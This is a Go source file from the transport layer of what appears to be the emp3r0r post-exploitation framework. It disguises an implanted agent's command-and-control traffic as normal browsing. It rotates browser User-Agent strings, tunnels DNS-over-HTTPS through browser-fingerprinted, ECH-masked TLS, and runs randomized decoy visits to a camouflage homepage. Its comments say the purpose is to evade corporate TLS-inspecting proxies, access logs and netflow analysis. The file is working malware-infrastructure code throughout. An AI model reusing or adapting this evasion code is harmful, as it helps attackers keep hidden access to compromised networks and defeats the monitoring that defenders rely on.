// Package transport — http_mimicry.go
//
// Browser-like HTTP request dressing for everything the agent and CC send
// over the browser-fingerprinted TLS channels. The TLS layer mimics a
// browser (uTLS specs + ECH) — the requests inside must not undo that:
// a bare gorilla handshake or a "Go-http-client/1.1" UA betrays the whole
// stack to any TLS-terminating middlebox (corporate proxies with a trusted
// root CA) or to access logs on the other end.
package transport

import (
	"context"
	"io"
	"os"
	"strconv"
	"net"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// browserUApool holds realistic UA strings for the platforms the TLS specs
// mimic (Chrome desktop, iOS Safari). Rotation matches the per-connection
// spec rotation — a UA/JA3 mismatch would require correlating both, which
// passive middleboxes don't do.
var browserUAPool = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
}

// BrowserUserAgent returns a random realistic UA string.
func BrowserUserAgent() string {
	return browserUAPool[util.RandInt(0, len(browserUAPool))]
}

// BrowserRequestHeaders dresses an outbound request with browser-like
// cosmetic headers. The secret is passed as a Bearer token — never in the
// URL query, which ends up in every access log.
func BrowserRequestHeaders(h http.Header, secret string) {
	if h == nil {
		return
	}
	h.Set("User-Agent", BrowserUserAgent())
	h.Set("Accept-Language", "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7")
	h.Set("Cache-Control", "no-cache")
	h.Set("Pragma", "no-cache")
	if secret != "" {
		h.Set("Authorization", "Bearer "+secret)
	}
}

// DoHHTTPClient returns an HTTP client for DoH POSTs that rides the
// browser-fingerprinted TLS dialer (pinned IPs optional).
func DoHHTTPClient(pinnedIPs []string) *http.Client {
	return &http.Client{
		Timeout: 8 * time.Second,
		Transport: &http.Transport{
			ForceAttemptHTTP2: false,
			DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
				return BrowserLikeTLSDial(ctx, addr, pinnedIPs)
			},
		},
	}
}

// DoHPost performs an RFC 8484 POST with browser dressing and the secret
// in the Authorization header. The URL must NOT carry the secret.
func DoHPost(client *http.Client, dohURL, secret string, wire []byte) ([]byte, error) {
	// strip any ?secret= from the URL — it rides the header instead
	if i := strings.IndexByte(dohURL, '?'); i >= 0 {
		if u, err := url.Parse(dohURL); err == nil {
			u.RawQuery = ""
			dohURL = u.String()
		}
	}
	req, err := http.NewRequest(http.MethodPost, dohURL, strings.NewReader(string(wire)))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/dns-message")
	BrowserRequestHeaders(req.Header, secret)
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, io.ErrUnexpectedEOF
	}
	return io.ReadAll(io.LimitReader(resp.Body, 4096))
}

// ---------------------------------------------------------------------------
// DoH resolver with full request control (replaces ncruces for the agent)
// ---------------------------------------------------------------------------

// NewMimicDoHResolver returns a *net.Resolver whose lookups POST to the
// given DoH URL over a browser-fingerprinted, optionally ECH-masked
// connection, with browser-like request headers and the secret in the
// Authorization header. pinnedIPs, when non-empty, dials those addresses
// directly (TLS SNI still selects the zone).
//
// It implements the net.Resolver Dial shim: the resolver speaks its wire
// protocol to a fake net.Conn which round-trips each query over HTTPS.
func NewMimicDoHResolver(dohURL string, pinnedIPs []string) (*net.Resolver, error) {
	secret := ""
	if u, err := url.Parse(dohURL); err == nil {
		secret = u.Query().Get("secret")
	}
	client := DoHHTTPClient(pinnedIPs)

	roundTrip := func(ctx context.Context, req string) (string, error) {
		body, err := DoHPost(client, dohURL, secret, []byte(req))
		if err != nil {
			return "", err
		}
		return string(body), nil
	}

	return &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			return &mimicDNSConn{roundTrip: roundTrip}, nil
		},
	}, nil
}

// mimicDNSConn adapts the Go resolver's TCP-style DNS framing
// (2-byte length prefix) onto an HTTPS round-trip per message.
type mimicDNSConn struct {
	roundTrip func(ctx context.Context, req string) (string, error)

	ibuf strings.Builder // pending query bytes
	obuf []byte          // pending answer bytes
	once sync.Once
}

func (c *mimicDNSConn) Read(b []byte) (int, error) {
	// drain buffered answer first
	if len(c.obuf) > 0 {
		n := copy(b, c.obuf)
		c.obuf = c.obuf[n:]
		return n, nil
	}
	// frame: 2-byte length + message
	raw := c.ibuf.String()
	if len(raw) < 2 {
		return 0, io.ErrUnexpectedEOF
	}
	size := int(raw[0])<<8 | int(raw[1])
	if len(raw) < 2+size {
		return 0, io.ErrUnexpectedEOF
	}
	msg := raw[2 : 2+size]
	c.ibuf.Reset()
	c.ibuf.WriteString(raw[2+size:])

	ctx, cancel := context.WithTimeout(context.Background(), 8*time.Second)
	defer cancel()
	answer, err := c.roundTrip(ctx, msg)
	if err != nil {
		return 0, err
	}
	out := make([]byte, 2+len(answer))
	out[0] = byte(len(answer) >> 8)
	out[1] = byte(len(answer))
	copy(out[2:], answer)
	n := copy(b, out)
	c.obuf = out[n:]
	return n, nil
}

func (c *mimicDNSConn) Write(b []byte) (int, error) {
	c.ibuf.Write(b)
	return len(b), nil
}

func (c *mimicDNSConn) Close() error                       { return nil }
func (c *mimicDNSConn) LocalAddr() net.Addr                { return nil }
func (c *mimicDNSConn) RemoteAddr() net.Addr                { return nil }
func (c *mimicDNSConn) SetDeadline(t time.Time) error      { return nil }
func (c *mimicDNSConn) SetReadDeadline(t time.Time) error  { return nil }
func (c *mimicDNSConn) SetWriteDeadline(t time.Time) error { return nil }

// ---------------------------------------------------------------------------
// Decoy visits: make the host look like it periodically browses the site
// ---------------------------------------------------------------------------

// A relay-only agent talks to exactly one domain over one persistent WSS —
// the "single-domain appliance" pattern. Real browsing scatters across
// domains and re-loads pages. Every few hello cycles the agent therefore
// opens a TRANSIENT browser-fingerprinted connection to the relay's own
// camouflage homepage (no secret — exactly what an unauthenticated visitor
// looks like) and discards it. Netflow now shows "periodic site visits +
// one app connection" instead of "one eternal connection, nothing else".
var (
	decoyMu    sync.Mutex
	decoySeen  = 0
	decoyNext  = 2 // fire on a random hello count; re-rolled after each visit
)

// MaybeDecoyVisit counts hello cycles and, every 2-5 of them, fetches the
// camouflage homepage (and the favicon, like a real page load) on a fresh
// connection. Best effort: errors are ignored by design.
func MaybeDecoyVisit(relayURL string) {
	decoyMu.Lock()
	decoySeen++
	// EMP_DECOY_EVERY_N: debug knob to fire every Nth hello (default: 2-5)
	if n := os.Getenv("EMP_DECOY_EVERY_N"); n != "" {
		if v, err := strconv.Atoi(n); err == nil && v > 0 {
			decoyNext = v
		}
	}
	fire := decoySeen >= decoyNext
	if fire {
		decoySeen = 0
		decoyNext = util.RandInt(2, 6)
	}
	decoyMu.Unlock()
	if !fire {
		return
	}
	logging.Infof("decoy visit: fetching the camouflage homepage")

	go func() {
		u, err := url.Parse(relayURL)
		if err != nil || u.Host == "" {
			return
		}
		client := &http.Client{
			Timeout: 10 * time.Second,
			Transport: &http.Transport{
				ForceAttemptHTTP2: false,
				DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
					// resolved via net.DefaultResolver (the agent's DoH);
					// ECH-masked once the config is cached
					return BrowserLikeTLSDial(ctx, addr, nil)
				},
			},
		}
		// a page load: / then /favicon.ico
		for _, path := range []string{"/", "/favicon.ico"} {
			req, err := http.NewRequestWithContext(context.Background(), http.MethodGet, "https://"+u.Host+path, nil)
			if err != nil {
				return
			}
			// no Authorization — an unauthenticated visitor is the point
			BrowserRequestHeaders(req.Header, "")
			req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
			resp, err := client.Do(req)
			if err != nil {
				return
			}
			io.Copy(io.Discard, io.LimitReader(resp.Body, 64<<10))
			resp.Body.Close()
			time.Sleep(time.Duration(util.RandInt(80, 400)) * time.Millisecond)
		}
	}()
}
